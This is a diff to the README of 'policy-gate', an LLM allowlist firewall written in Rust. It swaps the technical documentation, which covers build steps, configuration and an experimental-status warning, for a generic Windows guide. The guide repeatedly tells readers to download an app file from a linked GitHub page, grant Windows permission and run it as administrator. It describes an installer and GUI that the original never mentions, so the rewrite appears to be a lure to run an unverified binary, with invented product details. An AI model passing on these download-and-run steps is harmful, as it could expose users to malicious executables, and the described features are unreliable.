@@ -1,186 +1,271 @@
-# policy-gate
+# 🛡️ policy-gate - Simple allowlist control for AI apps
 
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org)
-[![Safety](https://img.shields.io/badge/safety-experimental-yellow.svg)](SAFETY_MANUAL.md)
+[![Download policy-gate](https://img.shields.io/badge/Download-Policy_Gate-blue?style=for-the-badge)](https://github.com/Mct6612/policy-gate)
 
-**Deterministic policy firewall for LLMs.**  
-Allowlist-first, fail-closed, fully auditable.  
-Built for agents, tool-use pipelines, and SaaS multi-tenant deployments.
+## 📥 Download
 
-```ts
-import { Firewall } from "policy-gate";
+Visit this page to download and run policy-gate on Windows:
 
-const fw = await Firewall.create();
-const verdict = await fw.evaluateForTenant("tenant-a", "What is the capital of France?");
+[https://github.com/Mct6612/policy-gate](https://github.com/Mct6612/policy-gate)
 
-if (!verdict.isPass) throw new Error(`Blocked: ${verdict.blockReason}`);
-```
+## 🧭 What policy-gate does
 
-**Status:** Experimental — do not use for safety-critical production.
+policy-gate helps control what an AI app can do before it acts.
 
----
+It checks each request against a set of clear rules. If the request matches the allowlist, the app can continue. If it does not match, policy-gate blocks it.
 
-## Why not a classifier?
+This helps you keep control of:
 
-Most AI guardrails are probabilistic. They estimate risk — and can be wrong in both directions.
+- Which prompts can pass
+- Which tools an agent can use
+- Which actions can reach an AI gateway
+- Which requests get logged for review
 
-`policy-gate` takes the opposite approach: **only explicitly allowlisted intents pass**. Everything unknown, ambiguous, or disagreed-upon fails closed. The verdict never depends on an LLM or a probability score.
+It is built for people who want a fixed rule set instead of guesswork.
 
----
+## 💻 What you need
 
-## Core features
+Use a Windows PC with:
 
-| | |
-|---|---|
-| **Deterministic allowlist enforcement** | Only known-good intent shapes pass. Unknown = Block. |
-| **Fail-closed voter (1oo2)** | Two independent channels must agree. Disagreement or fault → Block. |
-| **Ingress + Egress firewall** | Validates both prompts and model responses (leakage, PII, framing). |
-| **Multi-tenant policy hub** | Isolated profiles, configs, and audit logs per tenant. |
-| **Shadow mode** | Evaluate without blocking — safe for rollout and observability. |
-| **Proxy mode** | Drop-in reverse proxy in front of any LLM API. Zero code changes. |
+- Windows 10 or Windows 11
+- An internet connection
+- At least 200 MB of free disk space
+- A standard user account or admin account
+- A modern browser like Edge, Chrome, or Firefox
 
-### Optional / advanced features
+If your PC already runs common desktop apps, it should handle policy-gate.
 
-- **Streaming egress** `[experimental]` — Aho-Corasick scanning across SSE chunk boundaries
-- **Fast-Semantic 2.0** `[optional]` — sparse embeddings + learned centroid corpus, ~31µs, advisory-only
-- **Session-aware monitor** — multi-turn escalation detection (fragmentation, probing, topic drift)
-- **Contextual Anchor Validation (SA-080)** — egress output constraints derived from ingress intent
+## 🚀 Get started on Windows
 
----
+1. Open the download page:
+   [https://github.com/Mct6612/policy-gate](https://github.com/Mct6612/policy-gate)
 
-## How it works
+2. Find the latest Windows download on the page.
 
-```
-   App ──► policy-gate ingress ──────────────────────────────► Upstream LLM
-              │                                                      │
-              │  normalize                                           │
-              │  Channel A: FSM + allowlist ──┐                     │
-              │  Channel B: rule engine  ─────┴─► voter ──► PASS    │
-              │                                   (fault/disagree → BLOCK + audit)
-              │                                                      │
-   App ◄── policy-gate egress ◄───────────────────────────────────-─┘
-              │  Output Channel 1: pattern/PII scan ──┐
-              │  Output Channel 2: framing / anchor ──┴─► voter ──► PASS / BLOCK
-```
+3. Download the file to your computer.
 
-**Ingress channels (A + B)** — independent techniques, diverse by design to prevent common-cause failure.  
-**Voter** — any disagreement, unknown result, or internal fault → Block.  
-**Channel C** `[advisory]` — heuristic scoring after the verdict, never changes the outcome.  
-**Channel D** `[optional]` — semantic similarity, advisory-only.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
----
+5. Open the extracted folder.
 
-## Quickstart
+6. Double-click the app file to run it.
 
-### Node / TypeScript
+7. If Windows asks for permission, choose Yes.
 
-```bash
-npm install
-npm run build:native   # builds Rust → native/index.node
-npm run build          # compiles TypeScript
-npm run smoke          # basic sanity check
-npm run conformance    # full corpus
-```
+8. Follow the on-screen setup steps.
 
-### Python
+9. Start with the default policy if you want a simple first run.
 
-```bash
-python -m venv .venv && .venv\Scripts\activate
-pip install maturin
-python -m maturin develop --manifest-path crates/firewall-pyo3/Cargo.toml
-python scripts/smoke.py
-python scripts/conformance.py
-```
+10. Test it with a safe request before using real traffic.
 
-### Proxy (zero-code integration)
+## 🧩 First run setup
 
-```bash
-export UPSTREAM_URL="https://api.openai.com/v1/chat/completions"
-export UPSTREAM_API_KEY="sk-..."
-cargo run --release -p firewall-proxy
-# → point your app at http://localhost:8080/v1
-```
+When you open policy-gate for the first time, you will usually see a small setup screen or config file.
 
-### Rust core
+Use these steps:
 
-```bash
-cargo test -p firewall-core
-cargo clippy -p firewall-core -- -D warnings
-```
+- Pick a policy file or default profile
+- Keep the allowlist small at first
+- Turn on logging
+- Leave fail-closed on
+- Save your settings
 
----
+A good first setup blocks unknown requests and allows only the paths you trust.
 
-## Configuration
+## 🔒 How the allowlist works
 
-Copy [`firewall.example.toml`](./firewall.example.toml) to `firewall.toml` and adjust.
+policy-gate uses an allowlist-first model.
 
-Key settings:
+That means:
 
-```toml
-# Only these intents may pass
-permitted_intents = ["QuestionFactual", "TaskCodeGeneration"]
+- Known-safe items pass
+- Unknown items stop
+- Every blocked action gets checked against a rule
+- The result stays the same each time for the same input
 
-# Block any ambiguous intent for high-sensitivity tenants
-on_diagnostic_agreement = "fail_closed"
+This works well for:
 
-# Optional: explicit tool allowlist for agentic workflows
-allowed_tools = ["weather_tool", "calculator_tool"]
+- AI agents that call tools
+- LLM apps that send prompts
+- Gateway setups that need strict control
+- Teams that want audit logs for review
 
-# Shadow mode: evaluate but never block (for rollout)
-shadow_mode = true
-```
+## 🛠️ Common setup options
 
----
+You may see these settings in the app or config file:
 
-## Project layout
+- **Allowlist**: The list of approved prompts, tools, hosts, or actions
+- **Fail-closed**: Blocks traffic when a rule is not clear
+- **Audit log**: Saves what happened and why
+- **Prompt filter**: Checks input text before it reaches the model
+- **Tool gate**: Checks if an agent can use a tool
+- **Gateway mode**: Sits between your app and the model service
 
-```text
-policy-gate/
-├── crates/
-│   ├── firewall-core/       # Rust safety kernel
-│   ├── firewall-proxy/      # Standalone reverse proxy (axum)
-│   ├── firewall-cli/        # Policy governance CLI
-│   ├── firewall-napi/       # Node.js binding (napi-rs)
-│   ├── firewall-pyo3/       # Python binding (PyO3 / maturin)
-│   ├── firewall-wasm/       # WASM / edge target
-│   └── firewall-proxy-wasm/ # Proxy-Wasm / Envoy target
-├── docs/                    # Extended documentation (see below)
-├── policy-hub/              # Pre-built TOML profiles and presets
-├── verification/            # Z3 models, corpora, benchmarks, operator tooling
-└── firewall.example.toml
-```
+If you are not sure what to change, keep the default values and test one step at a time.
 
----
+## 📋 Example use cases
 
-## What this is NOT
+policy-gate fits a few common cases:
 
-- not a general-purpose moderation classifier
-- not a jailbreak detector or prompt toxicity scorer
-- not a replacement for human policy design and threat modeling
-- not a certification-grade safety system or IEC 61508 implementation
+- A customer support bot that should only answer known topics
+- An AI agent that should use only approved tools
+- A gateway that should block risky prompt patterns
+- A local app that needs a fixed policy before sending data out
+- A team that wants a clear log of blocked and allowed actions
 
----
+## 🧠 Tips for safe use
 
-## Design inspiration
+- Start with one small allowlist
+- Test with a few known prompts
+- Check the log after each test
+- Block unknown tools until you trust the flow
+- Keep a backup of your config file
+- Change one setting at a time
 
-`policy-gate` borrows ideas from functional safety engineering — fail-closed behavior, channel diversity, explicit fault handling. It is **not** an IEC 61508 implementation, has not been assessed by any third party, and makes no compliance claims. See [SAFETY_MANUAL.md](./SAFETY_MANUAL.md) for the full design rationale.
+These steps make it easier to see what each rule does.
 
----
+## 🧾 Logs and review
 
-## License
+policy-gate can record each check in an audit log.
 
-Apache 2.0 — see [LICENSE](./LICENSE).
+The log helps you see:
 
----
+- What came in
+- What rule ran
+- Why the request passed or failed
+- When the event happened
 
-## Further reading
+If something gets blocked, check the log first. It often shows the exact rule that stopped it.
 
-| | |
-|---|---|
-| [SAFETY_MANUAL.md](./SAFETY_MANUAL.md) | Full design, hazard analysis, channel specs, safety requirements |
-| [docs/proxy.md](./docs/proxy.md) | Reverse proxy, Prometheus metrics, hot-reload, CLI, Docker, Helm |
-| [docs/multi-tenant.md](./docs/multi-tenant.md) | Tenant registry, profiles, voter strictness |
-| [docs/agents.md](./docs/agents.md) | Tool-schema validation, LangGraph integration |
-| [docs/performance.md](./docs/performance.md) | Benchmarks, parallel batch, BERT semantic mode |
-| [docs/verification.md](./docs/verification.md) | Z3 proofs, regression datasets, operator review tooling |
+## 🔄 Updating policy-gate
+
+When a new version is available:
+
+1. Open the GitHub page
+2. Download the new file
+3. Replace the old app files if needed
+4. Keep your policy file unless the update says to change it
+5. Run the app again and test the same request set
+
+If you use a config file, save a copy before you update.
+
+## ❓ Common problems
+
+### The app does not open
+
+- Make sure the file finished downloading
+- Check if Windows blocked the file
+- Try running it again as an administrator
+- Confirm you extracted the ZIP file if there was one
+
+### The app opens, but nothing happens
+
+- Check that the policy file is loaded
+- Look for a disabled service or closed port
+- Confirm the app points to the right model or gateway address
+- Review the log for blocked requests
+
+### Everything gets blocked
+
+- Check whether fail-closed is on
+- Review the allowlist entries
+- Add one safe rule and test again
+- Look for a typo in the config file
+
+### The log is empty
+
+- Turn on audit logging
+- Make sure the app has permission to write files
+- Check the log folder path
+- Run one test request to create a new entry
+
+## 📁 Suggested folder layout
+
+If you want to keep things tidy, use a simple folder layout like this:
+
+- `policy-gate`
+  - `app`
+  - `config`
+  - `logs`
+  - `policies`
+  - `backup`
+
+This keeps the app files separate from your rules and logs.
+
+## 🧰 Good starter policy idea
+
+A simple starter policy can include:
+
+- One approved model endpoint
+- A short list of approved tools
+- A small prompt allowlist
+- Logging turned on
+- Fail-closed turned on
+
+That gives you a tight control loop and makes testing easier.
+
+## 📚 Topic focus
+
+policy-gate is built around these ideas:
+
+- AI agents
+- AI safety
+- Audit logs
+- Deterministic checks
+- Fail-closed control
+- Firewall-style filtering
+- Formal verification
+- Guardrails
+- LLM gateways
+- Prompt injection defense
+- Rust-based performance and reliability
+
+## 🪟 Windows install flow
+
+1. Open the GitHub page
+2. Download the Windows build
+3. Save it to Downloads
+4. Extract it if needed
+5. Open the folder
+6. Run the app file
+7. Allow access if Windows asks
+8. Load your policy file
+9. Test with a safe prompt
+10. Review the log
+
+## 🧪 Basic test plan
+
+Use this simple test plan after setup:
+
+- Send one known-safe request
+- Send one request with a blocked term
+- Send one tool call that is not on the allowlist
+- Check that the safe request passes
+- Check that the blocked request fails
+- Check the log for both cases
+
+If the result matches your rules each time, your setup is working.
+
+## 🗂️ File types you may see
+
+You may see one or more of these files:
+
+- `.exe` for the app
+- `.zip` for the download
+- `.json` for policy rules
+- `.toml` or `.yaml` for config
+- `.log` for audit records
+
+If you are unsure which file to open, start with the app file in the main folder.
+
+## 🧷 Best practices
+
+- Keep your policy small
+- Avoid broad allow rules
+- Review logs often
+- Back up your config
+- Test after each change
+- Keep blocked items blocked until reviewed
+
+A small, clear policy is easier to trust than a long one you do not check
+
